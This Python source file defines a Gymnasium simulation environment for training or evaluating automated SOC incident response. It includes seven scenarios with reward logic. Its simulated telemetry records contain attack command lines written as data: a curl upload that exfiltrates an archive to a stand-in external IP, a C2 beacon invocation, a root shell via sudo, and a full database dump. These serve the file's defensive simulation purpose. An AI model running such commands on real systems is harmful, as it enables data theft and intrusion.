# Responsibility: Sequential SOC Simulation Environment (soc_env) for Multi-Step Incident Response
#
# Models multi-step incident progression, state transitions, and simulated response outcomes
# following Gymnasium conventions, preserving the frozen 768-dim SecBERT encoder and the 20-action space.
#
# SAFETY NOTICE: All response actions in this environment are purely simulated.
# No live host processes are terminated, no network interfaces are modified,
# and no credentials or configurations are altered.

import os
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, Union
import gymnasium as gym
from gymnasium import spaces
import numpy as np
import pandas as pd
import torch

from src.encoder import SecBERTStateEncoder
from src.telemetry.incident_formatter import IncidentRecord, IncidentFormatter


@dataclass
class RewardConfig:
    """
    Configurable reward weights for the sequential SOC simulation environment.
    All values are experimental parameters designed for multi-step exploration,
    not empirically validated production constants.
    """
    containment_reward: float = 2.0       # Reward for successful containment of active threat
    benign_clearance_reward: float = 2.0  # Reward for correctly clearing/dismissing benign activity
    step_cost: float = -0.1              # Slight latency/delay penalty per step to discourage stalling
    ineffective_penalty: float = -0.5    # Penalty when chosen response is ineffective for current stage
    disruption_penalty: float = -1.0     # Cost when disruptive action is executed unnecessarily/on benign activity
    investigation_reward: float = 0.2    # Modest reward for appropriate non-disruptive detection/triage
    breach_penalty: float = -2.0         # Penalty when attack completes final stage uncontained
    escalation_reward: float = 0.0       # Bounded baseline outcome when escalating to human tier
    escalation_cost: float = 0.0         # Optional operational triage overhead penalty for human escalation


@dataclass
class ScenarioStage:
    """
    A single progression stage within an incident scenario.
    """
    stage_id: int
    name: str
    description: str
    incident_record: IncidentRecord
    effective_actions: List[int] = field(default_factory=list)
    investigative_actions: List[int] = field(default_factory=list)
    disruptive_actions: List[int] = field(default_factory=list)
    requires_network: bool = False
    target_ip: Optional[str] = None
    target_account: Optional[str] = None


@dataclass
class IncidentScenario:
    """
    Multi-stage incident scenario modeling sequential attack progression or benign operations.
    """
    scenario_id: str
    name: str
    description: str
    stages: List[ScenarioStage] = field(default_factory=list)
    is_benign: bool = False
    metadata: Dict[str, Any] = field(default_factory=dict)


def get_default_scenarios() -> List[IncidentScenario]:
    """
    Construct realistic, pre-configured attack scenarios grounded in observed telemetry
    and MITRE ATT&CK progression. All records are explicitly identified as simulated.
    """
    scenarios: List[IncidentScenario] = []

    # ─────────────────────────────────────────────────────────────────────────
    # Scenario 1: Discovery to Outbound C2 Beaconing & Exfiltration
    # ─────────────────────────────────────────────────────────────────────────
    stage_disc = ScenarioStage(
        stage_id=0,
        name="Discovery & Local Execution",
        description="Adversary executes unauthorized system enumeration (whoami / id).",
        incident_record=IncidentRecord(
            incident_id="sim_scen1_stage0",
            timestamp="2026-10-12T10:00:00Z",
            host="workstation-01",
            source="simulated",
            process_path="/usr/bin/whoami",
            process_name="whoami",
            cmdline="whoami",
            pid=41020,
            parent_pid=41010,
            uid=1000,
            cwd="/tmp/staging",
            syscall="exec",
            phase="Detection",
            metadata={"simulated": True, "technique": "T1033"},
        ),
        effective_actions=[8],             # kill_process
        investigative_actions=[0, 1, 17],  # monitor, enable_deep_logging, snapshot_forensics
        disruptive_actions=[7, 12],        # isolate_host, disable_account (premature at discovery)
        requires_network=False,
    )

    stage_c2 = ScenarioStage(
        stage_id=1,
        name="Outbound C2 Communication",
        description="Adversary beaconing to external attacker infrastructure on port 443.",
        incident_record=IncidentRecord(
            incident_id="sim_scen1_stage1",
            timestamp="2026-10-12T10:01:30Z",
            host="workstation-01",
            source="simulated",
            process_path="/usr/bin/python3",
            process_name="python3",
            cmdline="python3 /tmp/staging/beacon.py --c2 198.51.100.24:443",
            pid=41035,
            parent_pid=41010,
            uid=1000,
            cwd="/tmp/staging",
            alert_id="wazuh_sim_c2_01",
            alert_level=8,
            rule_id="100204",
            rule_description="Outbound network connection to known suspicious IP.",
            mitre_techniques=["T1071.001"],
            mitre_tactics=["Command and Control"],
            phase="Detection",
            metadata={"simulated": True, "destination_ip": "198.51.100.24"},
        ),
        effective_actions=[4, 7, 8],       # block_dest_ip, isolate_host, kill_process
        investigative_actions=[1, 2, 17],  # enable_deep_logging, create_ioc_alert, snapshot_forensics
        disruptive_actions=[12],           # disable_account
        requires_network=True,
        target_ip="198.51.100.24",
    )

    stage_exfil = ScenarioStage(
        stage_id=2,
        name="Data Exfiltration & Impact",
        description="Adversary actively archiving and exfiltrating sensitive project databases.",
        incident_record=IncidentRecord(
            incident_id="sim_scen1_stage2",
            timestamp="2026-10-12T10:03:00Z",
            host="workstation-01",
            source="simulated",
            process_path="/usr/bin/curl",
            process_name="curl",
            cmdline="curl -X POST -F data=@/tmp/staging/exfil.tar.gz https://198.51.100.24/upload",
            pid=41099,
            uid=1000,
            alert_id="wazuh_sim_exfil_02",
            alert_level=10,
            rule_id="100299",
            rule_description="High-volume data transfer to unapproved external destination.",
            mitre_techniques=["T1048.002"],
            mitre_tactics=["Exfiltration"],
            phase="Detection",
            metadata={"simulated": True},
        ),
        effective_actions=[4, 7],          # block_dest_ip, isolate_host
        investigative_actions=[1, 17],     # enable_deep_logging, snapshot_forensics
        disruptive_actions=[],
        requires_network=True,
        target_ip="198.51.100.24",
    )

    scenarios.append(
        IncidentScenario(
            scenario_id="scen_c2_exfil",
            name="Endpoint Discovery to Outbound C2 Exfiltration",
            description="Multi-stage progression from initial discovery to active data exfiltration.",
            stages=[stage_disc, stage_c2, stage_exfil],
            is_benign=False,
            metadata={"simulated": True},
        )
    )

    # ─────────────────────────────────────────────────────────────────────────
    # Scenario 2: Sudo Privilege Escalation to Persistence
    # ─────────────────────────────────────────────────────────────────────────
    stage_sudo = ScenarioStage(
        stage_id=0,
        name="Privilege Escalation Attempt",
        description="Execution of privileged command via sudo exploitation.",
        incident_record=IncidentRecord(
            incident_id="sim_scen2_stage0",
            timestamp="2026-10-12T11:00:00Z",
            host="server-db-01",
            source="simulated",
            process_path="/usr/bin/sudo",
            process_name="sudo",
            cmdline="sudo -u root /bin/bash",
            pid=63214,
            uid=1001,
            username="avidz",
            alert_id="wazuh_sim_sudo_5402",
            alert_level=7,
            rule_id="5402",
            rule_description="Unauthorized sudo escalation to root executed.",
            mitre_techniques=["T1548.003"],
            mitre_tactics=["Privilege Escalation", "Defense Evasion"],
            phase="Detection",
            metadata={"simulated": True},
        ),
        effective_actions=[11, 12, 8],     # reset_credentials, disable_account, kill_process
        investigative_actions=[1, 17],     # enable_deep_logging, snapshot_forensics
        disruptive_actions=[7],            # isolate_host on critical database server
        target_account="avidz",
    )

    stage_persist = ScenarioStage(
        stage_id=1,
        name="Persistence Mechanism Installation",
        description="Cron service backdoor or autorun scheduled task registered.",
        incident_record=IncidentRecord(
            incident_id="sim_scen2_stage1",
            timestamp="2026-10-12T11:02:00Z",
            host="server-db-01",
            source="simulated",
            process_path="/usr/bin/crontab",
            cmdline="crontab -e",
            pid=63290,
            uid=0,
            username="root",
            alert_id="wazuh_sim_cron_03",
            alert_level=9,
            rule_id="100512",
            rule_description="Cron table modified by unauthorized interactive root session.",
            mitre_techniques=["T1053.003"],
            mitre_tactics=["Persistence"],
            phase="Detection",
            metadata={"simulated": True},
        ),
        effective_actions=[13, 12, 7],     # remove_persistence, disable_account, isolate_host
        investigative_actions=[1, 17],
        disruptive_actions=[],
        target_account="avidz",
    )

    scenarios.append(
        IncidentScenario(
            scenario_id="scen_privesc_persist",
            name="Sudo Privilege Escalation to Root Persistence",
            description="Compromised user account attempts root escalation and scheduled task persistence.",
            stages=[stage_sudo, stage_persist],
            is_benign=False,
            metadata={"simulated": True},
        )
    )

    # ─────────────────────────────────────────────────────────────────────────
    # Scenario 3: Benign Administrative Maintenance (False Positive Challenge)
    # ─────────────────────────────────────────────────────────────────────────
    stage_benign = ScenarioStage(
        stage_id=0,
        name="Routine Admin Backup",
        description="Scheduled administrative rsync backup script executing under legitimate admin credentials.",
        incident_record=IncidentRecord(
            incident_id="sim_scen3_stage0",
            timestamp="2026-10-12T12:00:00Z",
            host="backup-node-01",
            source="simulated",
            process_path="/usr/bin/rsync",
            cmdline="rsync -avz /var/log/ /mnt/backup/",
            pid=12040,
            uid=0,
            username="backup_admin",
            alert_id="wazuh_sim_rsync_01",
            alert_level=2,
            rule_id="100010",
            rule_description="Scheduled system backup executed by known backup service account.",
            phase="Detection",
            metadata={"simulated": True, "benign": True},
        ),
        effective_actions=[0, 1],          # monitor, enable_deep_logging (correct non-disruptive response)
        investigative_actions=[0, 1],
        disruptive_actions=[4, 7, 8, 12],  # block_dest_ip, isolate_host, kill_process, disable_account
    )

    scenarios.append(
        IncidentScenario(
            scenario_id="scen_benign_backup",
            name="Benign Administrative Maintenance",
            description="Routine scheduled backup script; evaluates resistance to false positive disruptions.",
            stages=[stage_benign],
            is_benign=True,
            metadata={"simulated": True, "benign": True},
        )
    )

    # ─────────────────────────────────────────────────────────────────────────
    # Scenario 4: Credential Misuse to Lateral Database Access (Malicious)
    # ─────────────────────────────────────────────────────────────────────────
    stage_cred_auth = ScenarioStage(
        stage_id=0,
        name="Stolen Credential Authentication",
        description="Adversary authenticating with stolen developer SSH private key from external subnet.",
        incident_record=IncidentRecord(
            incident_id="sim_scen4_stage0",
            timestamp="2026-10-12T13:00:00Z",
            host="bastion-internal-01",
            source="simulated",
            process_path="/usr/sbin/sshd",
            process_name="sshd",
            cmdline="sshd: devops_lead [priv]",
            pid=55102,
            uid=1002,
            username="devops_lead",
            alert_id="wazuh_sim_auth_5710",
            alert_level=8,
            rule_id="5710",
            rule_description="Multiple SSH sessions established from unapproved external subnet for privileged account.",
            mitre_techniques=["T1078.003", "T1021.004"],
            mitre_tactics=["Initial Access", "Lateral Movement"],
            phase="Detection",
            metadata={"simulated": True, "source_ip": "203.0.113.88"},
        ),
        effective_actions=[11, 12],        # reset_credentials, disable_account (kill_process is ineffective)
        investigative_actions=[1, 17],     # enable_deep_logging, snapshot_forensics
        disruptive_actions=[7],            # isolate_host on critical core bastion
        target_account="devops_lead",
    )

    stage_cred_dump = ScenarioStage(
        stage_id=1,
        name="Lateral Database Dump & Exfiltration",
        description="Unauthorized database extraction and export using hijacked developer credentials.",
        incident_record=IncidentRecord(
            incident_id="sim_scen4_stage1",
            timestamp="2026-10-12T13:02:30Z",
            host="server-db-prod-02",
            source="simulated",
            process_path="/usr/bin/mysqldump",
            process_name="mysqldump",
            cmdline="mysqldump --all-databases -u devops_lead > /dev/shm/core_db.sql",
            pid=55199,
            uid=1002,
            username="devops_lead",
            alert_id="wazuh_sim_sql_100310",
            alert_level=9,
            rule_id="100310",
            rule_description="Bulk database table extraction executed by compromised developer session.",
            mitre_techniques=["T1005", "T1530"],
            mitre_tactics=["Collection", "Exfiltration"],
            phase="Detection",
            metadata={"simulated": True},
        ),
        effective_actions=[11, 12, 7],     # reset_credentials, disable_account, isolate_host
        investigative_actions=[1, 17],
        disruptive_actions=[],
        target_account="devops_lead",
    )

    scenarios.append(
        IncidentScenario(
            scenario_id="scen_credential_lateral",
            name="Stolen Privileged Credentials to Lateral Database Dump",
            description="Compromised credentials used across bastion hosts; process termination alone is ineffective.",
            stages=[stage_cred_auth, stage_cred_dump],
            is_benign=False,
            metadata={"simulated": True},
        )
    )

    # ─────────────────────────────────────────────────────────────────────────
    # Scenario 5: Web Application Remote Code Execution & C2 Tunnel (Malicious)
    # ─────────────────────────────────────────────────────────────────────────
    stage_rce_tunnel = ScenarioStage(
        stage_id=0,
        name="Web Service Exploit & Reverse Socket",
        description="Public-facing web API exploited to open reverse TCP tunnel; auto-respawn prevents process termination.",
        incident_record=IncidentRecord(
            incident_id="sim_scen5_stage0",
            timestamp="2026-10-12T14:00:00Z",
            host="web-portal-01",
            source="simulated",
            process_path="/usr/bin/node",
            process_name="node",
            cmdline="node /var/www/portal/app.js",
            pid=71010,
            uid=33,
            username="www-data",
            alert_id="wazuh_sim_web_100450",
            alert_level=8,
            rule_id="100450",
            rule_description="HTTP payload triggered outbound reverse TCP tunnel to unapproved IP 198.51.100.99:8080.",
            mitre_techniques=["T1190", "T1572"],
            mitre_tactics=["Initial Access", "Command and Control"],
            phase="Detection",
            metadata={"simulated": True, "destination_ip": "198.51.100.99"},
        ),
        effective_actions=[4, 3, 16],      # block_dest_ip, block_source_ip, patch_vulnerability
        investigative_actions=[1, 2, 17],  # enable_deep_logging, create_ioc_alert, snapshot_forensics
        disruptive_actions=[12],           # disable_account on service account breaks portal
        requires_network=True,
        target_ip="198.51.100.99",
    )

    stage_tunnel_exfil = ScenarioStage(
        stage_id=1,
        name="Persistent Encrypted Stream Exfiltration",
        description="Continuous encrypted stream exfiltration over persistent outbound tunnel.",
        incident_record=IncidentRecord(
            incident_id="sim_scen5_stage1",
            timestamp="2026-10-12T14:03:00Z",
            host="web-portal-01",
            source="simulated",
            process_path="/usr/bin/node",
            process_name="node",
            cmdline="node /var/www/portal/tunnel_exfil.js --target 198.51.100.99",
            pid=71088,
            uid=33,
            username="www-data",
            alert_id="wazuh_sim_exfil_100480",
            alert_level=10,
            rule_id="100480",
            rule_description="High-volume encrypted outbound tunnel exfiltration stream.",
            mitre_techniques=["T1041"],
            mitre_tactics=["Exfiltration"],
            phase="Detection",
            metadata={"simulated": True},
        ),
        effective_actions=[4, 7],          # block_dest_ip, isolate_host
        investigative_actions=[1, 17],
        disruptive_actions=[],
        requires_network=True,
        target_ip="198.51.100.99",
    )

    scenarios.append(
        IncidentScenario(
            scenario_id="scen_network_rce_tunnel",
            name="Web Application Exploit to Outbound Network Tunnel",
            description="Daemon-supervised web worker reverse tunnel; network egress block required.",
            stages=[stage_rce_tunnel, stage_tunnel_exfil],
            is_benign=False,
            metadata={"simulated": True},
        )
    )

    # ─────────────────────────────────────────────────────────────────────────
    # Scenario 6: Benign DevOps Build in Staging Directory (False Positive Challenge)
    # ─────────────────────────────────────────────────────────────────────────
    stage_devops_build = ScenarioStage(
        stage_id=0,
        name="Automated CI/CD Endpoint Health Verification",
        description="Automated continuous integration pipeline testing API endpoints from temporary build directory.",
        incident_record=IncidentRecord(
            incident_id="sim_scen6_stage0",
            timestamp="2026-10-12T15:00:00Z",
            host="build-worker-03",
            source="simulated",
            process_path="/usr/bin/python3",
            process_name="python3",
            cmdline="python3 /tmp/ci_build/test_endpoints.py --verify-ssl",
            pid=33410,
            uid=1005,
            username="build_service",
            cwd="/tmp/ci_build",
            alert_id="wazuh_sim_ci_100201",
            alert_level=6,
            rule_id="100201",
            rule_description="Script execution within /tmp directory by service account.",
            mitre_techniques=["T1059.006"],
            mitre_tactics=["Execution"],
            phase="Detection",
            metadata={"simulated": True, "benign": True},
        ),
        effective_actions=[0, 1],          # monitor, enable_deep_logging (non-disruptive)
        investigative_actions=[0, 1],
        disruptive_actions=[8, 7, 12, 4],  # kill_process, isolate_host, disable_account, block_dest_ip
    )

    scenarios.append(
        IncidentScenario(
            scenario_id="scen_benign_devops_tooling",
            name="Benign DevOps Build in Temporary Workspace",
            description="Legitimate CI/CD build script running from /tmp; tests resistance to naive /tmp termination.",
            stages=[stage_devops_build],
            is_benign=True,
            metadata={"simulated": True, "benign": True},
        )
    )

    # ─────────────────────────────────────────────────────────────────────────
    # Scenario 7: Benign Internal Vulnerability Assessment (False Positive Challenge)
    # ─────────────────────────────────────────────────────────────────────────
    stage_sec_scan = ScenarioStage(
        stage_id=0,
        name="Approved Internal Vulnerability Scan",
        description="Scheduled compliance vulnerability assessment executing authorized port and service scans.",
        incident_record=IncidentRecord(
            incident_id="sim_scen7_stage0",
            timestamp="2026-10-12T16:00:00Z",
            host="audit-scanner-01",
            source="simulated",
            process_path="/usr/bin/nmap",
            process_name="nmap",
            cmdline="nmap -sV -p 22,80,443,3306 10.0.0.0/24",
            pid=88201,
            uid=0,
            username="sec_audit",
            alert_id="wazuh_sim_scan_100150",
            alert_level=7,
            rule_id="100150",
            rule_description="High-rate SYN network scanning activity detected from internal scanner.",
            mitre_techniques=["T1046"],
            mitre_tactics=["Discovery"],
            phase="Detection",
            metadata={"simulated": True, "benign": True},
        ),
        effective_actions=[0, 1],          # monitor, enable_deep_logging (non-disruptive)
        investigative_actions=[0, 1],
        disruptive_actions=[3, 4, 7, 8],  # block_source_ip, block_dest_ip, isolate_host, kill_process
    )

    scenarios.append(
        IncidentScenario(
            scenario_id="scen_benign_security_audit",
            name="Authorized Internal Security Audit Scan",
            description="Approved vulnerability scanner generating high-volume scan alerts; tests false disruption.",
            stages=[stage_sec_scan],
            is_benign=True,
            metadata={"simulated": True, "benign": True},
        )
    )

    return scenarios


class SequentialSOCEnvironment(gym.Env):
    """
    Gymnasium-compatible sequential SOC simulation environment modeling multi-step
    incident progression, containment outcomes, and operational disruption costs.

    Key properties:
      - Action Space: Discrete(20) matching data/action_space.csv.
      - Observation Space: Box(768,) matching frozen SecBERT CLS pooler embeddings.
      - Safety: Purely simulated. Never modifies host OS, network, or running processes.
      - Reproducibility: Fully deterministic when seeded with env.reset(seed=int).
    """

    metadata = {"render_modes": ["human"]}

    def __init__(
        self,
        scenarios: Optional[List[IncidentScenario]] = None,
        encoder: Optional[SecBERTStateEncoder] = None,
        reward_config: Optional[RewardConfig] = None,
        max_steps: int = 10,
        action_space_path: str = "data/action_space.csv",
    ):
        super().__init__()

        # 1. Action and Observation Spaces
        self.action_space = spaces.Discrete(20)
        self.observation_space = spaces.Box(
            low=-np.inf, high=np.inf, shape=(768,), dtype=np.float32
        )

        # 2. Configurable scenarios & reward parameters
        self.scenarios = scenarios if scenarios is not None else get_default_scenarios()
        if not self.scenarios:
            raise ValueError("SequentialSOCEnvironment requires at least one IncidentScenario.")

        self.reward_config = reward_config if reward_config is not None else RewardConfig()
        self.max_steps = max_steps

        # 3. Action Space mapping
        self.action_to_name: Dict[int, str] = {}
        self.action_to_phase: Dict[int, str] = {}
        if os.path.exists(action_space_path):
            action_df = pd.read_csv(action_space_path)
            self.action_to_name = dict(zip(action_df["Index"], action_df["Action Name"]))
            self.action_to_phase = dict(zip(action_df["Index"], action_df["CISA Phase"]))

        # 4. SecBERT State Encoder
        self.encoder = encoder if encoder is not None else SecBERTStateEncoder()

        # 5. Episode Simulation State
        self.current_scenario: Optional[IncidentScenario] = None
        self.current_stage_idx: int = 0
        self.step_count: int = 0
        self.contained: bool = False
        self.cleared: bool = False
        self.compromised: bool = False
        self.escalated: bool = False
        self.action_history: List[int] = []
        self.current_embedding: Optional[torch.Tensor] = None
        self.simulated_state: Dict[str, Any] = {
            "isolated_hosts": set(),
            "blocked_ips": set(),
            "disabled_accounts": set(),
            "terminated_pids": set(),
        }

        # Random generator for seeded scenario selection
        self.np_random = np.random.RandomState()

    def _get_current_stage(self) -> ScenarioStage:
        """Return the current ScenarioStage of the active scenario."""
        if self.current_scenario is None or not self.current_scenario.stages:
            raise RuntimeError("Environment must be reset before accessing current stage.")
        idx = min(self.current_stage_idx, len(self.current_scenario.stages) - 1)
        return self.current_scenario.stages[idx]

    def _create_state(self, record: IncidentRecord) -> torch.Tensor:
        """
        Convert an IncidentRecord into a canonical 768-dimensional SecBERT embedding.
        """
        text = IncidentFormatter.format_incident_text(record, default_phase="Detection")
        embedding = self.encoder.encode_incident(text)
        if isinstance(embedding, np.ndarray):
            embedding = torch.from_numpy(embedding)
        return embedding

    def _extract_telemetry(self, stage: ScenarioStage) -> Dict[str, Any]:
        """Extract observable telemetry attributes from an active scenario stage."""
        rec = stage.incident_record
        return {
            "host": rec.host,
            "process_name": rec.process_name,
            "process_path": rec.process_path,
            "cmdline": rec.cmdline,
            "pid": rec.pid,
            "parent_pid": rec.parent_pid,
            "uid": rec.uid,
            "username": rec.username,
            "cwd": rec.cwd,
            "alert_id": rec.alert_id,
            "alert_level": rec.alert_level,
            "rule_id": rec.rule_id,
            "rule_description": rec.rule_description,
            "mitre_techniques": list(rec.mitre_techniques),
            "mitre_tactics": list(rec.mitre_tactics),
            "raw_text": IncidentFormatter.format_incident_text(rec),
        }

    def reset(
        self,
        seed: Optional[int] = None,
        options: Optional[Dict[str, Any]] = None,
    ) -> Tuple[torch.Tensor, Dict[str, Any]]:
        """
        Reset the simulation for a new incident scenario episode.

        Args:
            seed: Optional integer seed for deterministic scenario selection.
            options: Optional dict, e.g. {"scenario_id": "scen_c2_exfil"} to force a specific scenario.

        Returns:
            Tuple[torch.Tensor, dict]:
                - observation: 768-dim Tensor for the initial incident stage.
                - info: Scenario metadata.
        """
        super().reset(seed=seed)
        if seed is not None:
            torch.manual_seed(seed)

        # 1. Select scenario
        chosen_scenario: Optional[IncidentScenario] = None
        if options and "scenario_id" in options:
            req_id = options["scenario_id"]
            for sc in self.scenarios:
                if sc.scenario_id == req_id:
                    chosen_scenario = sc
                    break

        if chosen_scenario is None:
            sc_idx = self.np_random.choice(len(self.scenarios))
            chosen_scenario = self.scenarios[sc_idx]

        self.current_scenario = chosen_scenario
        self.current_stage_idx = 0
        self.step_count = 0
        self.contained = False
        self.cleared = False
        self.compromised = False
        self.escalated = False
        self.action_history.clear()
        self.simulated_state = {
            "isolated_hosts": set(),
            "blocked_ips": set(),
            "disabled_accounts": set(),
            "terminated_pids": set(),
        }

        # 2. Generate initial state embedding
        stage = self._get_current_stage()
        self.current_embedding = self._create_state(stage.incident_record)

        info: Dict[str, Any] = {
            "scenario_id": self.current_scenario.scenario_id,
            "scenario_name": self.current_scenario.name,
            "stage_id": stage.stage_id,
            "stage_name": stage.name,
            "is_benign": self.current_scenario.is_benign,
            "simulated": True,
            "telemetry": self._extract_telemetry(stage),
        }

        return self.current_embedding, info

    def step(
        self, action: int
    ) -> Tuple[torch.Tensor, float, bool, bool, Dict[str, Any]]:
        """
        Execute one response action in the simulation.

        State transition rules:
          - Effective Action (Malicious): Threat contained (contained=True, cleared=False).
          - Effective Action (Benign): Alert resolved without threat (cleared=True, contained=False).
          - Disruptive Action (Benign): Disruption penalty applied (disruptive_false_positive).
          - Ineffective Action (Benign): Bounded triage advance; reaches benign_unresolved on stage exhaustion.
          - Investigative Action: Intelligence gathered; attack advances.
          - Persistent Simulated Effects: Prior isolation/block/disable halts subsequent stages matching preconditions.
          - Escalate (Action 19): Caps risk with configurable escalation overhead.
          - Episode terminates on containment, benign clearance, breach compromise, or escalation.
          - Episode truncates when step_count reaches max_steps.

        Args:
            action: Discrete action integer (0-19).

        Returns:
            Tuple[torch.Tensor, float, bool, bool, dict]:
                (next_observation, reward, terminated, truncated, info)
        """
        if self.current_scenario is None:
            raise RuntimeError("Environment must be reset with env.reset() before calling env.step().")

        action_int = int(action)
        if not (0 <= action_int < 20):
            raise ValueError(f"Action {action_int} out of bounds for Discrete(20).")

        self.step_count += 1
        self.action_history.append(action_int)

        current_stage = self._get_current_stage()
        total_stages = len(self.current_scenario.stages)

        step_reward = self.reward_config.step_cost
        terminated = False
        truncated = False
        outcome = "in_progress"

        # ── 1. Evaluate Response Category ────────────────────────
        is_effective = action_int in current_stage.effective_actions
        is_investigative = action_int in current_stage.investigative_actions
        is_disruptive = action_int in current_stage.disruptive_actions

        # ── 2. Register Simulated Persistent Response Effects ───
        if action_int == 7:  # isolate_host
            if current_stage.incident_record.host:
                self.simulated_state["isolated_hosts"].add(current_stage.incident_record.host)
        elif action_int == 4:  # block_dest_ip
            target_ip = current_stage.target_ip or current_stage.incident_record.metadata.get("destination_ip")
            if target_ip:
                self.simulated_state["blocked_ips"].add(target_ip)
        elif action_int in (11, 12):  # reset_credentials, disable_account
            target_acct = current_stage.target_account or current_stage.incident_record.username
            if target_acct:
                self.simulated_state["disabled_accounts"].add(target_acct)
        elif action_int == 8:  # kill_process
            if current_stage.incident_record.pid is not None:
                self.simulated_state["terminated_pids"].add(current_stage.incident_record.pid)

        # ── 3. Handle Action 19: Escalate to Human ───────────────
        if action_int == 19:
            self.escalated = True
            terminated = True
            step_reward += (self.reward_config.escalation_reward - self.reward_config.escalation_cost)
            outcome = "escalated"

        # ── 4. Handle Benign Scenarios (False Positive Checks) ───
        elif self.current_scenario.is_benign:
            if is_disruptive:
                step_reward += self.reward_config.disruption_penalty
                outcome = "disruptive_false_positive"
                terminated = True
            elif is_effective:
                step_reward += self.reward_config.benign_clearance_reward
                self.cleared = True
                self.contained = False  # Strictly False: no threat existed to contain
                terminated = True
                outcome = "correctly_cleared_benign"
            elif is_investigative:
                step_reward += self.reward_config.investigation_reward
                outcome = "investigated_benign"
                self.current_stage_idx += 1
            else:
                step_reward += self.reward_config.ineffective_penalty
                outcome = "ineffective_benign"
                self.current_stage_idx += 1

            # Bounded triage: if benign scenario stages exhausted without resolution
            if not self.cleared and not terminated and self.current_stage_idx >= total_stages:
                terminated = True
                outcome = "benign_unresolved"

        # ── 5. Handle Malicious Scenarios ────────────────────────
        else:
            if is_effective:
                step_reward += self.reward_config.containment_reward
                self.contained = True
                self.cleared = False
                terminated = True
                outcome = "contained"

            elif is_disruptive:
                # Disruptive containment executed on the wrong target/stage
                step_reward += (self.reward_config.disruption_penalty + self.reward_config.ineffective_penalty)
                outcome = "mismatched_disruptive"
                self.current_stage_idx += 1

            elif is_investigative:
                step_reward += self.reward_config.investigation_reward
                outcome = "investigated"
                self.current_stage_idx += 1

            else:
                # Ineffective action
                step_reward += self.reward_config.ineffective_penalty
                outcome = "ineffective"
                self.current_stage_idx += 1

            # Check if persistent simulated response effects neutralize the upcoming stage
            if not terminated and self.current_stage_idx < total_stages:
                upcoming_stage = self.current_scenario.stages[self.current_stage_idx]
                if (
                    upcoming_stage.requires_network
                    and upcoming_stage.incident_record.host in self.simulated_state["isolated_hosts"]
                ):
                    self.contained = True
                    terminated = True
                    step_reward += self.reward_config.containment_reward
                    outcome = "contained_by_prior_isolation"
                elif (
                    upcoming_stage.target_ip
                    and upcoming_stage.target_ip in self.simulated_state["blocked_ips"]
                ):
                    self.contained = True
                    terminated = True
                    step_reward += self.reward_config.containment_reward
                    outcome = "contained_by_prior_block"
                elif (
                    upcoming_stage.target_account
                    and upcoming_stage.target_account in self.simulated_state["disabled_accounts"]
                ):
                    self.contained = True
                    terminated = True
                    step_reward += self.reward_config.containment_reward
                    outcome = "contained_by_prior_account_disable"

            # Check for attack compromise (breach reached final stage uncontained)
            if not self.contained and not terminated and self.current_stage_idx >= total_stages:
                self.compromised = True
                terminated = True
                step_reward += self.reward_config.breach_penalty
                outcome = "breach_compromised"

        # ── 6. Truncation Limit ──────────────────────────────────
        if self.step_count >= self.max_steps and not terminated:
            truncated = True

        # ── 7. State Transition / Next Observation ───────────────
        # If episode has ended, next state remains current stage observation
        next_stage = self._get_current_stage()
        self.current_embedding = self._create_state(next_stage.incident_record)

        info: Dict[str, Any] = {
            "scenario_id": self.current_scenario.scenario_id,
            "stage_id": next_stage.stage_id,
            "stage_name": next_stage.name,
            "action": action_int,
            "action_name": self.action_to_name.get(action_int, f"action_{action_int}"),
            "outcome": outcome,
            "contained": self.contained,
            "cleared": self.cleared,
            "compromised": self.compromised,
            "escalated": self.escalated,
            "step_count": self.step_count,
            "simulated": True,
            "simulated_state": {
                "isolated_hosts": list(self.simulated_state["isolated_hosts"]),
                "blocked_ips": list(self.simulated_state["blocked_ips"]),
                "disabled_accounts": list(self.simulated_state["disabled_accounts"]),
                "terminated_pids": list(self.simulated_state["terminated_pids"]),
            },
            "telemetry": self._extract_telemetry(next_stage),
        }

        return self.current_embedding, float(step_reward), terminated, truncated, info
